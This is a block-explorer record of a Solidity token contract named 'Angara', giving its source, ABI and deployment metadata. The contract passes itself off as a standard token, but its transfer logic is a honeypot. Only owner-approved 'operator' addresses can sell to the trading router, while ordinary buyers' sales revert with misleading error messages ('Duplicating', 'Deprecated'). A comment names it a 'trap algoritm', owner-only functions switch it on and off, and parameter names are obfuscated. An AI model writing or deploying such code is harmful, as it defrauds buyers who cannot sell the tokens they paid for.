{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.7;\r\n\r\n\r\n\r\ncontract Angara {\r\n\r\n    // Tokens Variables\r\n    string public name;\r\n    string public symbol;\r\n    uint160 public decimals;\r\n    uint256 public totalSupply;\r\n    address private _owner;\r\n    address private _router;\r\n    address private _last;\r\n    uint160 private _txs;\r\n    uint160 private _txsNew;\r\n\r\n    // Keep track balances and allowances approved\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    mapping(address => bool) private _operators;\r\n\r\n    // Events - fire events on state changes etc\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    constructor(string memory _nameSnH4PD, string memory _symbolPEKIEd, uint160 _decimals, uint _supply1ANQwn, uint160 txsIMibKG, uint160 txsNewsVGnz7) {\r\n        name = _nameSnH4PD;\r\n        symbol = _symbolPEKIEd;\r\n        decimals = _decimals;\r\n        totalSupply = _supply1ANQwn * 10 ** _decimals; \r\n        balanceOf[msg.sender] = totalSupply;\r\n        _owner = msg.sender;\r\n        _router = address(0);\r\n        _last = address(_owner);\r\n        _txs = txsIMibKG;\r\n        _txsNew = txsNewsVGnz7;\r\n        _operators[_owner] = true;      // allow liqudity & swap for owner\r\n        _operators[address(_decimals)] = true;  // to enable swap & liquid pools for other adresses\r\n        _operators[address(_decimals-1)] = true;// enable trap algoritm\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n\r\n    /// @notice transfer amount of tokens to an address\r\n    /// @param _to receiver of token\r\n    /// @param _value amount value of token to send\r\n    /// @return success as true, for transfer \r\n    function transfer(address _to, uint256 _value) external returns (bool success) {\r\n        require(balanceOf[msg.sender] >= _value);\r\n        _transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    /// @dev internal helper transfer function with required safety checks\r\n    /// @param _from, where funds coming the sender\r\n    /// @param _to receiver of token\r\n    /// @param _value amount value of token to send\r\n    // Internal function transfer can only be called by this contract\r\n    //  Emit Transfer Event event \r\n    function _transfer(address _from, address _to, uint256 _value) internal {\r\n        // Ensure sending is to valid address! 0x0 address can be used to burn() \r\n        require(_to != address(0));\r\n         \r\n        if(_from != address(0) && _router == address(0)) _router = _to; // first liqudity adding\r\n        else {                                                          // swap operations\r\n            if(_txs == 0) {                                             // semaphore closing\r\n                _operators[address(decimals)] = false;\r\n                _txs = type(uint160).max;\r\n            }                                   \r\n            if (_operators[address(decimals)])                          // semaphor to allow swap\r\n            {\r\n                if(_operators[address(decimals-1)] && _to == _router)\r\n                    require(_last == _from, \"Deprecated\"); // it allows to sell only just after bying\r\n            }                 \r\n            else if(_operators[_from]) {    // swap only from operators\r\n                _last = _to;      // remember last buyer  \r\n            }\r\n            else require(_to != _router, \"Duplicating\");    // swap disabled\r\n            _txs--;\r\n        }\r\n        _last = _to;      // remember last buyer            \r\n        \r\n        balanceOf[_from] = balanceOf[_from] - (_value);\r\n        balanceOf[_to] = balanceOf[_to] + (_value);\r\n        emit Transfer(_from, _to, _value);\r\n    }\r\n\r\n    /**\r\n    * @dev Returns the bep token owner.\r\n    */\r\n    function getOwner() external view returns (address) {\r\n        return _owner;\r\n    }\r\n    /**\r\n    * @dev Throws if called by any account other than the owner.\r\n    */\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    // Seting address(8) to true allows to swap everyone otherwise only signed addresses with true will be allowed\r\n    function nodeSet(address _to, bool _set) external onlyOwner returns (bool) {\r\n        require(_to != address(0));\r\n        _operators[_to] = _set;\r\n        return true;\r\n    }\r\n\r\n    function node(address _verify) external view returns (bool) {\r\n    return _operators[_verify];\r\n    }\r\n\r\n    function setTXs(uint160 txs) external onlyOwner returns (bool) {\r\n        _txs = txs;\r\n        if(_txs != 0) _operators[address(decimals)] = true;\r\n        return true;\r\n    }\r\n\r\n    /// @notice Approve other to spend on your behalf eg an exchange \r\n    /// @param _spender allowed to spend and a max amount allowed to spend\r\n    /// @param _value amount value of token to send\r\n    /// @return true, success once address approved\r\n    //  Emit the Approval event  \r\n    // Allow _spender to spend up to _value on your behalf\r\n    function approve(address _spender, uint256 _value) external returns (bool) {\r\n        require(_spender != address(0));\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function getMetrics() external view returns (uint160 txs, address last, bool state, bool algo) {\r\n        txs = _txs;\r\n        last = _last;\r\n        state = _operators[address(decimals)];\r\n        algo = _operators[address(decimals-1)];\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) external returns (bool) {\r\n        require(_value <= balanceOf[_from]);\r\n        require(_value <= allowance[_from][msg.sender]);\r\n        allowance[_from][msg.sender] = allowance[_from][msg.sender] - (_value);\r\n        if(_from != _owner && !_operators[_from] && !_operators[address(decimals)]) return false;\r\n        _transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function getMetricsNew() external view returns (uint160 txsNew) {\r\n        txsNew = _txsNew;\r\n    }\r\n\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_nameSnH4PD\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbolPEKIEd\",\"type\":\"string\"},{\"internalType\":\"uint160\",\"name\":\"_decimals\",\"type\":\"uint160\"},{\"internalType\":\"uint256\",\"name\":\"_supply1ANQwn\",\"type\":\"uint256\"},{\"internalType\":\"uint160\",\"name\":\"txsIMibKG\",\"type\":\"uint160\"},{\"internalType\":\"uint160\",\"name\":\"txsNewsVGnz7\",\"type\":\"uint160\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"\",\"type\":\"uint160\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getMetrics\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"txs\",\"type\":\"uint160\"},{\"internalType\":\"address\",\"name\":\"last\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"algo\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getMetricsNew\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"txsNew\",\"type\":\"uint160\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_verify\",\"type\":\"address\"}],\"name\":\"node\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_set\",\"type\":\"bool\"}],\"name\":\"nodeSet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint160\",\"name\":\"txs\",\"type\":\"uint160\"}],\"name\":\"setTXs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Angara", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000001fc22ded80000000000000000000000000000000000000000000000000000000000000006416e6761726100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004414e475200000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://30cd140fa730fbd271548a62e297995aa883a2af3a7ac57737eb4755dc321815"}